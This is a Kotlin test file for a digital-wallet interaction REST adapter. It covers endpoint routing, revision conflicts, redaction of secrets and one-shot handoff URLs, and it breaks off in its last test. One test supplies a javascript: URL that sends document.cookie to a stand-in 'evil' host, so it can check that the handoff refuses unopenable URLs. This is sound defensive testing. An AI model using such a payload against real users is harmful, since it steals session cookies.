/*
 * Copyright 2026 Sphereon International B.V.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 */

package com.sphereon.wallet.interaction.client.rest

import com.sphereon.core.api.IdkResult
import com.sphereon.core.api.Err
import com.sphereon.core.api.Ok
import com.sphereon.core.api.conf.AppConfigService
import com.sphereon.core.api.conf.ConfigLevel
import com.sphereon.core.api.conf.ConfigService
import com.sphereon.core.api.conf.PrincipalConfigService
import com.sphereon.core.api.conf.TenantConfigService
import com.sphereon.core.api.context.ContextConfig
import com.sphereon.core.api.context.IdkScope
import com.sphereon.core.api.context.SessionExecution
import com.sphereon.core.api.error.IdkError
import com.sphereon.core.api.error.IdkErrorType
import com.sphereon.core.api.http.GenericHttpRequest
import com.sphereon.core.api.http.GenericHttpResponse
import com.sphereon.core.api.http.command.HttpEndpointCommand
import com.sphereon.core.api.http.command.HttpEndpointCommandRegistry
import com.sphereon.core.api.http.dispatch.HttpAdapterRouteMatch
import com.sphereon.core.api.log.AsyncLogService
import com.sphereon.core.api.log.LogMessage
import com.sphereon.core.api.log.LogService
import com.sphereon.core.api.log.LoggerConfig
import com.sphereon.core.api.log.SessionLogManager
import com.sphereon.core.api.log.SessionLogService
import com.sphereon.di.context.NoOpSessionContext
import com.sphereon.di.session.SessionContext
import com.sphereon.di.session.SessionContextManager
import com.sphereon.wallet.interaction.DispatchWalletInteractionActionBody
import com.sphereon.wallet.interaction.ListWalletInteractionActivityResult
import com.sphereon.wallet.interaction.WalletApprovalOperation
import com.sphereon.wallet.interaction.WalletCounterpartyAssociationDecision
import com.sphereon.wallet.interaction.WalletCounterpartyRole
import com.sphereon.wallet.interaction.WalletCounterpartySummary
import com.sphereon.wallet.interaction.WalletCounterpartyTrustSummary
import com.sphereon.wallet.interaction.ConsumeWalletInteractionHandoffRequest
import com.sphereon.wallet.interaction.ConsumeWalletInteractionHandoffResult
import com.sphereon.wallet.interaction.RegisterWalletInteractionSensitiveInputRequest
import com.sphereon.wallet.interaction.RegisterWalletInteractionSensitiveInputResult
import com.sphereon.wallet.interaction.StartWalletInteractionBody
import com.sphereon.wallet.interaction.WalletEntryPoint
import com.sphereon.wallet.interaction.WalletInteractionCompletionTransport
import com.sphereon.wallet.interaction.WalletInteractionAction
import com.sphereon.wallet.interaction.WalletInteractionApiConstants
import com.sphereon.wallet.interaction.WalletInteractionClientFrame
import com.sphereon.wallet.interaction.WalletInteractionClientFrameType
import com.sphereon.wallet.interaction.WalletInteractionContext
import com.sphereon.wallet.interaction.WalletInteractionInput
import com.sphereon.wallet.interaction.WalletInteractionLaunchAuthority
import com.sphereon.wallet.interaction.WalletInteractionRevisionConflict
import com.sphereon.wallet.interaction.WalletInteractionServerFrame
import com.sphereon.wallet.interaction.WalletInteractionServerFrameType
import com.sphereon.wallet.interaction.WalletInteractionSession
import com.sphereon.wallet.interaction.WalletInteractionSessionEnvelope
import com.sphereon.wallet.interaction.WalletInteractionSessionId
import com.sphereon.wallet.interaction.WalletInteractionState
import com.sphereon.wallet.interaction.WalletInteractionPrivateSessionData
import com.sphereon.wallet.interaction.WalletInteractionProtocolAdapter
import com.sphereon.wallet.interaction.WalletInteractionStateEnvelope
import com.sphereon.wallet.interaction.WalletInteractionSensitiveInputPurpose
import com.sphereon.wallet.interaction.WalletInteractionStateEvent
import com.sphereon.wallet.interaction.WalletInteractionStatus
import com.sphereon.wallet.interaction.WalletSecurityAssurance
import com.sphereon.wallet.interaction.WalletSecurityChallenge
import com.sphereon.wallet.interaction.WalletSecurityChallengeKind
import com.sphereon.wallet.interaction.WalletTrustSource
import com.sphereon.wallet.interaction.WalletTrustSourceType
import com.sphereon.wallet.interaction.WalletTrustStatus
import com.sphereon.wallet.interaction.actionsPath
import com.sphereon.wallet.interaction.activityPath
import com.sphereon.wallet.interaction.eventsPath
import com.sphereon.wallet.interaction.framePath
import com.sphereon.wallet.interaction.impl.CancelWalletInteractionCommandImpl
import com.sphereon.wallet.interaction.impl.ConsumeWalletInteractionAuthorizationHandoffCommandImpl
import com.sphereon.wallet.interaction.impl.ConsumeWalletInteractionCompletionHandoffCommandImpl
import com.sphereon.wallet.interaction.impl.DefaultWalletInteractionEngine
import com.sphereon.wallet.interaction.impl.FixedWalletInteractionSessionIdGenerator
import com.sphereon.wallet.interaction.impl.GetWalletInteractionEventsCommandImpl
import com.sphereon.wallet.interaction.impl.GetWalletInteractionStateCommandImpl
import com.sphereon.wallet.interaction.impl.InMemoryWalletInteractionPrivateSessionStore
import com.sphereon.wallet.interaction.impl.InMemoryWalletInteractionSessionStore
import com.sphereon.wallet.interaction.impl.ListWalletInteractionActivityCommandImpl
import com.sphereon.wallet.interaction.impl.RegisterWalletInteractionSensitiveInputCommandImpl
import com.sphereon.wallet.interaction.impl.StoreBackedWalletInteractionSensitiveInputAuthority
import com.sphereon.wallet.interaction.impl.ResumeWalletInteractionCommandImpl
import com.sphereon.wallet.interaction.impl.StartWalletInteractionCommandImpl
import com.sphereon.wallet.interaction.impl.StaticWalletInteractionProtocolAdapter
import com.sphereon.wallet.interaction.impl.SubmitWalletInteractionActionCommandImpl
import com.sphereon.wallet.interaction.interactionPath
import com.sphereon.wallet.interaction.interactionsPath
import com.sphereon.wallet.interaction.authorizationHandoffPath
import com.sphereon.wallet.interaction.sensitiveInputsPath
import com.sphereon.wallet.interaction.statePath
import kotlinx.coroutines.test.runTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertNotNull
import kotlin.test.assertNull
import kotlin.test.assertTrue
import com.sphereon.wallet.interaction.WalletInteractionDiagnostics

class WalletInteractionHttpAdapterTest {
    @Test
    fun descriptorProviderPublishesFullPathsAndMatchingAdapterId() {
        val description = WalletInteractionHttpAdapterDescriptorProvider().describe()

        assertEquals(WalletInteractionHttpAdapter.ADAPTER_ID, description.id)
        assertEquals(WalletInteractionApiConstants.BASE_PATH, description.mount.adapterBasePath)
        assertEquals(
            WalletInteractionApiConstants.Paths.INTERACTIONS,
            StartWalletInteractionHttpEndpointCommand.ENDPOINT.pathPattern,
        )
        assertTrue(
            description.endpoints.any {
                it.pathPattern == "${WalletInteractionApiConstants.BASE_PATH}${WalletInteractionApiConstants.Paths.EVENTS}"
            },
        )
        assertTrue(
            description.endpoints.any {
                it.pathPattern == "${WalletInteractionApiConstants.BASE_PATH}${WalletInteractionApiConstants.Paths.SENSITIVE_INPUTS}"
            },
        )
        assertTrue(
            description.endpoints.any {
                it.pathPattern == "${WalletInteractionApiConstants.BASE_PATH}${WalletInteractionApiConstants.Paths.ACTIVITY}"
            },
        )
        val completionEndpoint = description.endpoints.single {
            it.handlerCommandId == WalletInteractionApiConstants.EndpointCommands.CONSUME_COMPLETION_HANDOFF
        }
        assertEquals(WalletInteractionApiConstants.Commands.CONSUME_COMPLETION_HANDOFF, completionEndpoint.commandId)
        assertEquals(WalletInteractionApiConstants.EndpointCommands.CONSUME_COMPLETION_HANDOFF, completionEndpoint.handlerCommandId)
        val frameEndpoint =
            description.endpoints.single { it.handlerCommandId == WalletInteractionApiConstants.EndpointCommands.FRAME }
        assertEquals(WalletInteractionApiConstants.Commands.FRAME, frameEndpoint.commandId)
        // commandId is the neutral service command the endpoint authorizes as, and it must equal
        // the x-command-id of the wallet-interaction contract. handlerCommandId is the separate
        // route-dispatch key. Asserting both keeps a policy written against the published command
        // id from silently missing these two endpoints.
        val sensitiveInputEndpoint =
            description.endpoints.single { it.handlerCommandId == WalletInteractionApiConstants.EndpointCommands.REGISTER_SENSITIVE_INPUT }
        assertEquals("wallet.interaction.register-sensitive-input", sensitiveInputEndpoint.commandId)
        val activityEndpoint =
            description.endpoints.single { it.handlerCommandId == WalletInteractionApiConstants.EndpointCommands.LIST_ACTIVITY }
        assertEquals("wallet.interaction.list-activity", activityEndpoint.commandId)
        val consumeHandoffEndpoint =
            description.endpoints.single { it.handlerCommandId == WalletInteractionApiConstants.EndpointCommands.CONSUME_AUTHORIZATION_HANDOFF }
        assertEquals("wallet.interaction.consume-authorization-handoff", consumeHandoffEndpoint.commandId)
        assertTrue(
            description.endpoints.any {
                it.pathPattern == "${WalletInteractionApiConstants.BASE_PATH}${WalletInteractionApiConstants.Paths.AUTHORIZATION_HANDOFF}"
            },
        )
    }

    @Test
    fun commandBackedAdapterRoutesRestLifecycleToInteractionClient() =
        runTest {
            val engine = testEngine()
            val adapter = testAdapter(engine)
            val input = WalletInteractionInput("wallet", WalletEntryPoint.rawQr("openid-credential-offer://?credential_offer=x"))

            val startedResponse =
                adapter.handle(
                    GenericHttpRequest.withTextBody(
                        method = "POST",
                        path = WalletInteractionApiConstants.interactionsPath("wallet"),
                        body =
                            defaultWalletInteractionJson.encodeToString(
                                StartWalletInteractionBody.serializer(),
                                StartWalletInteractionBody(input),
                            ),
                    ),
                )
            val started =
                defaultWalletInteractionJson
                    .decodeFromString(WalletInteractionSessionEnvelope.serializer(), requireBody(startedResponse.body))
                    .session

            assertEquals(201, startedResponse.statusCode)
            assertEquals(WalletInteractionStatus.CounterpartyNotice, started.state.status)

            val stateResponse =
                adapter.handle(
                    GenericHttpRequest(
                        method = "GET",
                        path = WalletInteractionApiConstants.statePath("wallet", started.sessionId),
                    ),
                )
            val state =
                defaultWalletInteractionJson
                    .decodeFromString(WalletInteractionStateEnvelope.serializer(), requireBody(stateResponse.body))
                    .state

            assertEquals(started.state, state)

            val actionResponse =
                adapter.handle(
                    GenericHttpRequest.withTextBody(
                        method = "POST",
                        path = WalletInteractionApiConstants.actionsPath("wallet", started.sessionId),
                        body =
                            defaultWalletInteractionJson.encodeToString(
                                DispatchWalletInteractionActionBody.serializer(),
                                DispatchWalletInteractionActionBody(WalletInteractionAction.continueFlow()),
                            ),
                    ),
                )
            val afterAction =
                defaultWalletInteractionJson
                    .decodeFromString(WalletInteractionStateEnvelope.serializer(), requireBody(actionResponse.body))
                    .state

            assertEquals(WalletInteractionStatus.Completed, afterAction.status)

            val cancelResponse =
                adapter.handle(
                    GenericHttpRequest(
                        method = "DELETE",
                        path = WalletInteractionApiConstants.interactionPath("wallet", started.sessionId),
                    ),
                )

            assertEquals(200, cancelResponse.statusCode)
            assertEquals(WalletInteractionStatus.Cancelled, engine.observe(started.sessionId).value.status)
        }

    @Test
    fun currentOpenApiStateFieldsRoundTripThroughTheRestStateEndpoint() = runTest {
        val baseAdapter = StaticWalletInteractionProtocolAdapter.oid4vci()
        val operations = listOf(WalletApprovalOperation("holder-signing-key", "sha256:approved-input"))
        val trustSources = listOf(
            WalletTrustSource(
                type = WalletTrustSourceType.TRUST_DOMAIN,
                identifier = "trust-domain:example",
                displayName = "Example trust domain",
            ),
            WalletTrustSource(
                type = WalletTrustSourceType.WALLET_TRUST_ANCHOR,
                identifier = "wallet-anchor:example",
                displayName = "Example wallet anchor",
            ),
        )
        val adapterWithCurrentContractFields = object : WalletInteractionProtocolAdapter by baseAdapter {
            override suspend fun start(
                context: WalletInteractionContext,
                entryPoint: WalletEntryPoint,
            ) = baseAdapter.start(context, entryPoint).let { session ->
                session.copy(
                    state = session.state.copy(
                        completionHandoffTransport = WalletInteractionCompletionTransport.DIGITAL_CREDENTIALS_API,
                        securityChallenge = WalletSecurityChallenge(
                            challengeId = "challenge-current-schema",
                            kind = WalletSecurityChallengeKind.PASSKEY,
                            reasonKey = "wallet.interaction.approval.required",
                            requiredAssurance = WalletSecurityAssurance.PASSKEY,
                            operations = operations,
                        ),
                        trust = WalletCounterpartyTrustSummary(
                            counterparty = WalletCounterpartySummary(
                                role = WalletCounterpartyRole.ISSUER,
                                identifier = "https://issuer.example",
                            ),
                            status = WalletTrustStatus.TRUSTED,
                            sources = trustSources,
                        ),
                    ),
                )
            }
        }
        val adapter = testAdapter(testEngine(adapters = listOf(adapterWithCurrentContractFields)))

        val startedResponse = adapter.handle(
            GenericHttpRequest.withTextBody(
                method = "POST",
                path = WalletInteractionApiConstants.interactionsPath("wallet"),
                body = defaultWalletInteractionJson.encodeToString(
                    StartWalletInteractionBody.serializer(),
                    StartWalletInteractionBody(
                        WalletInteractionInput("wallet", WalletEntryPoint.rawQr("openid-credential-offer://?credential_offer=x")),
                    ),
                ),
            ),
        )
        val started = defaultWalletInteractionJson.decodeFromString(
            WalletInteractionSessionEnvelope.serializer(),
            requireBody(startedResponse.body),
        ).session
        val stateResponse = adapter.handle(
            GenericHttpRequest(
                method = "GET",
                path = WalletInteractionApiConstants.statePath("wallet", started.sessionId),
            ),
        )
        val state = defaultWalletInteractionJson.decodeFromString(
            WalletInteractionStateEnvelope.serializer(),
            requireBody(stateResponse.body),
        ).state

        assertEquals(started.state, state)
        assertEquals(WalletInteractionCompletionTransport.DIGITAL_CREDENTIALS_API, state.completionHandoffTransport)
        assertEquals(operations, state.securityChallenge?.operations)
        assertEquals(
            listOf(WalletTrustSourceType.TRUST_DOMAIN, WalletTrustSourceType.WALLET_TRUST_ANCHOR),
            state.trust?.sources?.map { it.type },
        )
        assertEquals(trustSources, state.trust?.sources)
    }

    @Test
    fun sseEndpointReturnsBoundedSnapshotFrame() =
        runTest {
            val adapter = testAdapter(testEngine())
            val session = start(adapter)

            val response =
                adapter.handle(
                    GenericHttpRequest(
                        method = "GET",
                        path = WalletInteractionApiConstants.eventsPath("wallet", session.sessionId),
                    ),
                )

            assertEquals(200, response.statusCode)
            assertEquals("text/event-stream", response.headers["Content-Type"])
            assertTrue(requireBody(response.body).contains("event: ${WalletInteractionApiConstants.Sse.EVENT_STATE}"))
            assertTrue(requireBody(response.body).contains("\"revision\":${session.state.revision}"))

            val alreadySeen =
                adapter.handle(
                    GenericHttpRequest(
                        method = "GET",
                        path = WalletInteractionApiConstants.eventsPath("wallet", session.sessionId),
                        headers = mapOf(WalletInteractionApiConstants.Sse.LAST_EVENT_ID_HEADER to session.state.revision.toString()),
                    ),
                )

            assertEquals(200, alreadySeen.statusCode)
            assertEquals("", alreadySeen.body)
        }

    @Test
    fun frameEndpointRoutesClientFrame() =
        runTest {
            val adapter = testAdapter(testEngine())
            val session = start(adapter)

            val response =
                adapter.handle(
                    GenericHttpRequest.withTextBody(
                        method = "POST",
                        path = WalletInteractionApiConstants.framePath("wallet", session.sessionId),
                        body =
                            defaultWalletInteractionJson.encodeToString(
                                WalletInteractionClientFrame.serializer(),
                                WalletInteractionClientFrame(
                                    type = WalletInteractionClientFrameType.DISPATCH_ACTION,
                                    sessionId = session.sessionId,
                                    action = WalletInteractionAction.continueFlow(),
                                    lastRevision = session.state.revision,
                                ),
                            ),
                    ),
                )
            val frame =
                defaultWalletInteractionJson.decodeFromString(
                    WalletInteractionServerFrame.serializer(),
                    requireBody(response.body),
                )

            assertEquals(200, response.statusCode)
            assertEquals(WalletInteractionServerFrameType.STATE, frame.type)
            assertEquals(WalletInteractionStatus.Completed, frame.state?.status)
        }

    @Test
    fun actionsEndpointAppliesDispatchThatNamesTheCurrentRevision() =
        runTest {
            val adapter = testAdapter(testEngine())
            val session = start(adapter)

            val response = dispatch(adapter, session.sessionId, expectedRevision = session.state.revision)

            assertEquals(200, response.statusCode)
            val state =
                defaultWalletInteractionJson
                    .decodeFromString(WalletInteractionStateEnvelope.serializer(), requireBody(response.body))
                    .state
            assertEquals(WalletInteractionStatus.Completed, state.status)
        }

    /**
     * The stale-render case: the operator approves against a revision the session has already
     * moved past. The dispatch must be refused rather than applied, and the refusal must carry
     * enough for the client to re-render.
     */
    @Test
    fun actionsEndpointRefusesDispatchAgainstStaleRevision() =
        runTest {
            val engine = testEngine()
            val adapter = testAdapter(engine)
            val session = start(adapter)
            val staleRevision = session.state.revision
            // Advance the session so the revision the client is holding is no longer current.
            dispatch(adapter, session.sessionId, expectedRevision = null)
            val currentRevision = engine.observe(session.sessionId).value.revision
            assertTrue(currentRevision != staleRevision)

            val response = dispatch(adapter, session.sessionId, expectedRevision = staleRevision)

            assertEquals(409, response.statusCode)
            val conflict =
                defaultWalletInteractionJson
                    .decodeFromString(WalletInteractionRevisionConflict.serializer(), requireBody(response.body))
            assertEquals(session.sessionId, conflict.sessionId)
            assertEquals(staleRevision, conflict.expectedRevision)
            assertEquals(currentRevision, conflict.currentRevision)
            assertEquals(currentRevision, conflict.state.revision)
        }

    @Test
    fun frameEndpointRefusesDispatchFrameAgainstStaleRevision() =
        runTest {
            val engine = testEngine()
            val adapter = testAdapter(engine)
            val session = start(adapter)
            val staleRevision = session.state.revision
            dispatch(adapter, session.sessionId, expectedRevision = null)
            val currentRevision = engine.observe(session.sessionId).value.revision

            val response =
                adapter.handle(
                    GenericHttpRequest.withTextBody(
                        method = "POST",
                        path = WalletInteractionApiConstants.framePath("wallet", session.sessionId),
                        body =
                            defaultWalletInteractionJson.encodeToString(
                                WalletInteractionClientFrame.serializer(),
                                WalletInteractionClientFrame(
                                    type = WalletInteractionClientFrameType.DISPATCH_ACTION,
                                    sessionId = session.sessionId,
                                    action = WalletInteractionAction.continueFlow(),
                                    lastRevision = staleRevision,
                                ),
                            ),
                    ),
                )

            assertEquals(409, response.statusCode)
            val frame =
                defaultWalletInteractionJson
                    .decodeFromString(WalletInteractionServerFrame.serializer(), requireBody(response.body))
            assertEquals(WalletInteractionServerFrameType.ERROR, frame.type)
            assertEquals(WalletInteractionApiConstants.Errors.REVISION_CONFLICT, frame.error?.code)
            assertEquals(currentRevision, frame.revision)
            assertEquals(currentRevision, frame.state?.revision)
        }

    @Test
    fun frameEndpointRejectsPathSessionMismatch() =
        runTest {
            val adapter = testAdapter(testEngine())
            val session = start(adapter)
            val otherSessionId = WalletInteractionSessionId("other")

            val response =
                adapter.handle(
                    GenericHttpRequest.withTextBody(
                        method = "POST",
                        path = WalletInteractionApiConstants.framePath("wallet", session.sessionId),
                        body =
                            defaultWalletInteractionJson.encodeToString(
                                WalletInteractionClientFrame.serializer(),
                                WalletInteractionClientFrame(
                                    type = WalletInteractionClientFrameType.PING,
                                    sessionId = otherSessionId,
                                ),
                            ),
                    ),
                )

            assertEquals(400, response.statusCode)
            assertNotNull(response.body)
        }

    @Test
    fun sensitiveInputEndpointReturnsOnlyTheReference() =
        runTest {
            val adapter = testAdapter(testEngine())
            val session = start(adapter)
            val secretValue = "tx-code-secret-493536"

            val response =
                adapter.handle(
                    GenericHttpRequest.withTextBody(
                        method = "POST",
                        path = WalletInteractionApiConstants.sensitiveInputsPath("wallet", session.sessionId),
                        body =
                            defaultWalletInteractionJson.encodeToString(
                                RegisterWalletInteractionSensitiveInputRequest.serializer(),
                                RegisterWalletInteractionSensitiveInputRequest(
                                    purpose = WalletInteractionSensitiveInputPurpose.OID4VCI_TRANSACTION_CODE,
                                    value = secretValue,
                                ),
                            ),
                    ),
                )

            assertEquals(201, response.statusCode)
            assertEquals("application/json", response.headers["Content-Type"])
            val result =
                defaultWalletInteractionJson.decodeFromString(
                    RegisterWalletInteractionSensitiveInputResult.serializer(),
                    requireBody(response.body),
                )
            assertTrue(result.ref.value.isNotBlank())
            assertTrue(!requireBody(response.body).contains(secretValue))
        }

    @Test
    fun sensitiveInputEndpointRejectsServerSidePurpose() =
        runTest {
            val adapter = testAdapter(testEngine())
            val session = start(adapter)

            val response =
                adapter.handle(
                    GenericHttpRequest.withTextBody(
                        method = "POST",
                        path = WalletInteractionApiConstants.sensitiveInputsPath("wallet", session.sessionId),
                        body =
                            defaultWalletInteractionJson.encodeToString(
                                RegisterWalletInteractionSensitiveInputRequest.serializer(),
                                RegisterWalletInteractionSensitiveInputRequest(
                                    purpose = WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF,
                                    value = "server-side-material",
                                ),
                            ),
                    ),
                )

            assertEquals(400, response.statusCode)
            assertTrue(!requireBody(response.body).contains("server-side-material"))
        }

    @Test
    fun consumeAuthorizationHandoffReturnsTheUrlOnce() =
        runTest {
            val privateStore = InMemoryWalletInteractionPrivateSessionStore()
            val authority = StoreBackedWalletInteractionSensitiveInputAuthority(privateStore)
            val engine = testEngine(authority = authority, privateStore = privateStore)
            val session =
                engine.start(
                    WalletInteractionInput("wallet", WalletEntryPoint.rawQr("openid-credential-offer://?credential_offer=x")),
                )
            val authorizationUrl = "https://issuer.example/authorize?request=abc"
            val ref =
                authority.register(
                    session.sessionId,
                    WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF,
                    authorizationUrl,
                )

            val endpoint =
                ConsumeWalletInteractionAuthorizationHandoffHttpEndpointCommandImpl(
                    TestSessionExecution,
                    ConsumeWalletInteractionAuthorizationHandoffCommandImpl(TestSessionExecution, engine, authority),
                )
            val request =
                GenericHttpRequest.withTextBody(
                    method = "POST",
                    path =
                        WalletInteractionApiConstants.Paths.AUTHORIZATION_HANDOFF
                            .replace("{walletUnitId}", "wallet")
                            .replace("{sessionId}", session.sessionId.value),
                    pathParameters =
                        mapOf(
                            "walletUnitId" to "wallet",
                            "sessionId" to session.sessionId.value,
                        ),
                    body =
                        defaultWalletInteractionJson.encodeToString(
                            ConsumeWalletInteractionHandoffRequest.serializer(),
                            ConsumeWalletInteractionHandoffRequest(ref),
                        ),
                )
            val first = endpoint.execute(request)
            assertTrue(first is Ok)
            val response = (first as Ok).value
            assertEquals(200, response.statusCode, response.body)
            val result =
                defaultWalletInteractionJson.decodeFromString(
                    ConsumeWalletInteractionHandoffResult.serializer(),
                    requireBody(response.body),
                )
            assertEquals(authorizationUrl, result.value)

            val spent = endpoint.execute(request)
            assertTrue(spent is Err, "a spent handoff must not return the URL again")
        }

    @Test
    fun consumeCompletionHandoffReturnsTheUrlOnce() =
        runTest {
            val privateStore = InMemoryWalletInteractionPrivateSessionStore()
            val authority = StoreBackedWalletInteractionSensitiveInputAuthority(privateStore)
            val engine = testEngine(authority = authority, privateStore = privateStore)
            val session =
                engine.start(
                    WalletInteractionInput("wallet", WalletEntryPoint.rawQr("openid-credential-offer://?credential_offer=x")),
                )
            val authorizationUrl = "https://verifier.example/callback#response_code=secret%2Bvalue"
            val ref =
                authority.register(
                    session.sessionId,
                    WalletInteractionSensitiveInputPurpose.PROTOCOL_COMPLETION_HANDOFF,
                    authorizationUrl,
                )

            val endpoint =
                ConsumeWalletInteractionCompletionHandoffHttpEndpointCommandImpl(
                    TestSessionExecution,
                    ConsumeWalletInteractionCompletionHandoffCommandImpl(TestSessionExecution, engine, authority, privateStore),
                )
            val request =
                GenericHttpRequest.withTextBody(
                    method = "POST",
                    path =
                        WalletInteractionApiConstants.Paths.COMPLETION_HANDOFF
                            .replace("{walletUnitId}", "wallet")
                            .replace("{sessionId}", session.sessionId.value),
                    pathParameters =
                        mapOf(
                            "walletUnitId" to "wallet",
                            "sessionId" to session.sessionId.value,
                        ),
                    body =
                        defaultWalletInteractionJson.encodeToString(
                            ConsumeWalletInteractionHandoffRequest.serializer(),
                            ConsumeWalletInteractionHandoffRequest(ref),
                        ),
                )
            val foreignWallet = endpoint.execute(request.copy(pathParameters = request.pathParameters + ("walletUnitId" to "other-wallet")))
            assertTrue(foreignWallet is Err, "another wallet cannot spend the completion reference")
            assertEquals(authorizationUrl, authority.peek(session.sessionId, WalletInteractionSensitiveInputPurpose.PROTOCOL_COMPLETION_HANDOFF, ref))
            privateStore.put(session.sessionId, WalletInteractionPrivateSessionData("protocol-test", mapOf("private" to "retained-until-completion")))
            val first = endpoint.execute(request)
            assertTrue(first is Ok)
            val response = (first as Ok).value
            assertEquals(200, response.statusCode, response.body)
            val result =
                defaultWalletInteractionJson.decodeFromString(
                    ConsumeWalletInteractionHandoffResult.serializer(),
                    requireBody(response.body),
                )
            assertEquals(authorizationUrl, result.value)
            assertNull(privateStore.get(session.sessionId, "protocol-test"), "completion removes protocol private-session material")

            val spent = endpoint.execute(request)
            assertTrue(spent is Err, "a spent handoff must not return the URL again")
        }

    @Test
    fun consumeAuthorizationHandoffDoesNotSpendAnUnopenableUrl() =
        runTest {
            val privateStore = InMemoryWalletInteractionPrivateSessionStore()
            val authority = StoreBackedWalletInteractionSensitiveInputAuthority(privateStore)
            val engine = testEngine(authority = authority, privateStore = privateStore)
            val session =
                engine.start(
                    WalletInteractionInput("wallet", WalletEntryPoint.rawQr("openid-credential-offer://?credential_offer=x")),
                )
            val authorizationUrl = "javascript:fetch(\"//evil/\"+document.cookie)"
            val ref =
                authority.register(
                    session.sessionId,
                    WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF,
                    authorizationUrl,
                )

            val endpoint =
                ConsumeWalletInteractionAuthorizationHandoffHttpEndpointCommandImpl(
                    TestSessionExecution,
                    ConsumeWalletInteractionAuthorizationHandoffCommandImpl(TestSessionExecution, engine, authority),
                )
            val request =
                GenericHttpRequest.withTextBody(
                    method = "POST",
                    path =
                        WalletInteractionApiConstants.Paths.AUTHORIZATION_HANDOFF
                            .replace("{walletUnitId}", "wallet")
                            .replace("{sessionId}", session.sessionId.value),
                    pathParameters =
                        mapOf(
                            "walletUnitId" to "wallet",
                            "sessionId" to session.sessionId.value,
                        ),
                    body =
                        defaultWalletInteractionJson.encodeToString(
                            ConsumeWalletInteractionHandoffRequest.serializer(),
                            ConsumeWalletInteractionHandoffRequest(ref),
                        ),
                )
            val first = endpoint.execute(request)
            assertTrue(first is Err)
            val second = endpoint.execute(request)
            assertTrue(second is Err, "a refused URL must not spend the one-shot; the holder can try again")
            val firstError = (first as Err).error
            val secondError = (second as Err).error
            assertEquals("wallet_interaction_authorization_handoff_unopenable", firstError.message.defaultMessage)
            assertEquals("wallet_interaction_authorization_handoff_unopenable", secondError.message.defaultMessage)
        }

    @Test
    fun sensitiveInputEndpointDoesNotEchoTheValueWhenTheBodyFailsToDecode() =
        runTest {
            val adapter = testAdapter(testEngine())
            val session = start(adapter)
            val secretValue = "tx-code-secret-880413"

            // A malformed body is the leak path the purpose-rejection test above cannot reach: that
            // one decodes cleanly and fails a require(), while the JSON lexer appends the offending
            // document to its own message, and here that document carries the secret.
            val response =
                adapter.handle(
                    GenericHttpRequest.withTextBody(
                        method = "POST",
                        path = WalletInteractionApiConstants.sensitiveInputsPath("wallet", session.sessionId),
                        body = """{"purpose":"OID4VCI_TRANSACTION_CODE","value":"$secretValue",}""",
                    ),
                )

            assertEquals(400, response.statusCode)
            assertTrue(!requireBody(response.body).contains(secretValue))
        }

    @Test
    fun activityEndpointListsTerminalInteractionsWithNextCursor() =
        runTest {
            val adapter = testAdapter(testEngine())
            val session = start(adapter)

            adapter.handle(
                GenericHttpRequest.withTextBody(
                    method = "POST",
                    path = WalletInteractionApiConstants.actionsPath("wallet", session.sessionId),
                    body =
                        defaultWalletInteractionJson.encodeToString(
                            DispatchWalletInteractionActionBody.serializer(),
                            DispatchWalletInteractionActionBody(WalletInteractionAction.continueFlow()),
                        ),
                ),
            )

            val response =
                adapter.handle(
                    GenericHttpRequest(
                        method = "GET",
                        path = WalletInteractionApiConstants.activityPath("wallet"),
                    ),
                )

            assertEquals(200, response.statusCode)
            val page =
                defaultWalletInteractionJson.decodeFromString(
                    ListWalletInteractionActivityResult.serializer(),
                    requireBody(response.body),
                )
            assertEquals(1, page.entries.size)
            assertEquals(session.sessionId.value, page.entries.single().sessionId)
            assertEquals(WalletInteractionStatus.Completed, page.entries.single().status)
            assertEquals(page.entries.single().sequence, page.nextSequence)

            val nextPageResponse =
                adapter.handle(
                    GenericHttpRequest(
                        method = "GET",
                        path = WalletInteractionApiConstants.activityPath("wallet"),
                        queryParameters =
                            mapOf(
                                "afterSequence" to page.nextSequence.toString(),
                                "limit" to "10",
                            ),
                    ),
                )
            val nextPage =
                defaultWalletInteractionJson.decodeFromString(
                    ListWalletInteractionActivityResult.serializer(),
                    requireBody(nextPageResponse.body),
                )

            assertEquals(200, nextPageResponse.statusCode)
            assertTrue(nextPage.entries.isEmpty())
            assertNull(nextPage.nextSequence)
        }

    @Test
    fun activityEndpointRejectsInvalidQueryParameters() =
        runTest {
            val adapter = testAdapter(testEngine())

            val invalidSequence =
                adapter.handle(
                    GenericHttpRequest(
                        method = "GET",
                        path = WalletInteractionApiConstants.activityPath("wallet"),
                        queryParameters = mapOf("afterSequence" to "not-a-number"),
                    ),
                )
            val invalidLimit =
                adapter.handle(
                    GenericHttpRequest(
                        method = "GET",
                        path = WalletInteractionApiConstants.activityPath("wallet"),
                        queryParameters = mapOf("limit" to "0"),
                    ),
                )

            assertEquals(400, invalidSequence.statusCode)
            assertEquals(400, invalidLimit.statusCode)
        }

    @Test
    fun counterpartyAssociationDecisionUsesContractDiscriminators() {
        val keepSeparate: WalletCounterpartyAssociationDecision =
            WalletCounterpartyAssociationDecision.KeepSeparate("Acme Issuer")
        val associateExisting: WalletCounterpartyAssociationDecision =
            WalletCounterpartyAssociationDecision.AssociateExisting("party-1")

        val keepSeparateJson =
            defaultWalletInteractionJson.encodeToString(WalletCounterpartyAssociationDecision.serializer(), keepSeparate)
        val associateExistingJson =
            defaultWalletInteractionJson.encodeToString(WalletCounterpartyAssociationDecision.serializer(), associateExisting)

        assertTrue(keepSeparateJson.contains("\"type\":\"keep_separate\""))
        assertTrue(associateExistingJson.contains("\"type\":\"associate_existing\""))
        assertTrue(!keepSeparateJson.contains("com.sphereon"))
        assertTrue(!associateExistingJson.contains("com.sphereon"))
        assertEquals(
            keepSeparate,
            defaultWalletInteractionJson.decodeFromString(WalletCounterpartyAssociationDecision.serializer(), keepSeparateJson),
        )
        assertEquals(
            associateExisting,
            defaultWalletInteractionJson.decodeFromString(WalletCounterpartyAssociationDecision.serializer(), associateExistingJson),
        )
    }

    @Test
    fun sseParserAcceptsStateEvents() {
        val state =
            WalletInteractionState.resolving(
                WalletInteractionSessionId("s1"),
                WalletInteractionInput("wallet", WalletEntryPoint.rawQr("qr")),
            )
        val event = WalletInteractionStateEvent(state.sessionId, state.revision, state = state)
        val frame =
            "id: 0\n" +
